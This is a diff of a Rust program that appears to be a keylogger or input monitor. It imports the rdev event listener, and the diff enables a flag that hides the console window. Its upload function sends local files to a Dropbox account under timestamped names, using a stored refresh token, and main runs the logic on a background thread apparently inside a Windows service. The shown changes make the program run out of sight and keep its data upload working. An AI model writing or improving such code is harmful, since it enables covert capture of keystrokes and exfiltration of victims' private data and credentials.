@@ -1,4 +1,4 @@
-// #![windows_subsystem = "windows"]
+#![windows_subsystem = "windows"]
 use rdev::{listen, Event, EventType};
 use reqwest::header::{HeaderMap, HeaderValue, AUTHORIZATION, CONTENT_TYPE};
 use tokio::runtime::Runtime;
@@ -130,46 +130,55 @@ async fn get_token() -> Result<String, Box<dyn std::error::Error>> {
         }
     }else{
         if http::REFRESH_TOKEN.read().unwrap().is_empty() {
-            return http::get_token();
+            println!("No token available, fetching new token...");
+            return Err("No token available".into());
         }else{
+            println!("Fetching new token using refresh token...");
             return http::refresh_token();
         }
     }
 }
 
 async fn upload_file2(file_path: &str) -> Result<(), Box<dyn std::error::Error>> {
-        let tk: String = get_token().await?;
-        let access_token = format!("Bearer {}", tk);
-        let dropbox_destination = format!("/{}.txt", chrono::Utc::now().format("%Y-%m-%d_%H-%M-%S"));
-    
-        // === Đọc nội dung file ===
-        let file_data = fs::read(file_path)?;
-    
-        // === Tạo headers ===
-        let mut headers = HeaderMap::new();
-        headers.insert(AUTHORIZATION, HeaderValue::from_str(&access_token)?);
-        headers.insert("Dropbox-API-Arg", HeaderValue::from_str(&format!(
-            "{{\"path\": \"{}\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}}",
-            dropbox_destination
-        ))?);
-        headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/octet-stream"));
-    
-        // === Gửi request ===
-        let client = reqwest::Client::new();
-        let res = client
-            .post("https://content.dropboxapi.com/2/files/upload")
-            .headers(headers)
-            .body(file_data)
-            .send()
-            .await?;
-    
-        // === In kết quả ===
-        let status = res.status();
-        let text = res.text().await?;
-        println!("Status: {}", status);
-        println!("Response: {}", text);
-    
-        Ok(())
+    // Check if file is empty
+    let metadata = fs::metadata(file_path)?;
+    if metadata.len() == 0 {
+        // File is empty, return Ok(())
+        return Ok(());
+    }
+
+    let tk: String = get_token().await?;
+    let access_token = format!("Bearer {}", tk);
+    let dropbox_destination = format!("/{}.txt", chrono::Utc::now().format("%Y-%m-%d_%H-%M-%S"));
+
+    // === Đọc nội dung file ===
+    let file_data = fs::read(file_path)?;
+
+    // === Tạo headers ===
+    let mut headers = HeaderMap::new();
+    headers.insert(AUTHORIZATION, HeaderValue::from_str(&access_token)?);
+    headers.insert("Dropbox-API-Arg", HeaderValue::from_str(&format!(
+        "{{\"path\": \"{}\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}}",
+        dropbox_destination
+    ))?);
+    headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/octet-stream"));
+
+    // === Gửi request ===
+    let client = reqwest::Client::new();
+    let res = client
+        .post("https://content.dropboxapi.com/2/files/upload")
+        .headers(headers)
+        .body(file_data)
+        .send()
+        .await?;
+
+    // === In kết quả ===
+    let status = res.status();
+    let text = res.text().await?;
+    println!("Status: {}", status);
+    println!("Response: {}", text);
+
+    Ok(())
 }
 
 // Helper function to log messages to a file
@@ -193,9 +202,9 @@ fn main() -> Result<(), windows_service::Error> {
     //let is_debug = args.iter().any(|arg| arg == "-d");
     println!("Arguments: {:?}", args);
     println!("Running in debug mode...");
-    std::thread::spawn(move || {
-        server::http::listener();
-    });
+    // std::thread::spawn(move || {
+    //     server::http::listener();
+    // });
 
     // http::get_token().unwrap_or_else(|e| {
     //     eprintln!("Error getting token: {}", e);
@@ -204,6 +213,7 @@ fn main() -> Result<(), windows_service::Error> {
 
     http::read_refresh_token_from_file().unwrap();
     // If running in debug mode, run the service logic directly
+
     std::thread::spawn(move || {
         let rt = Runtime::new().unwrap();
         rt.block_on(async {
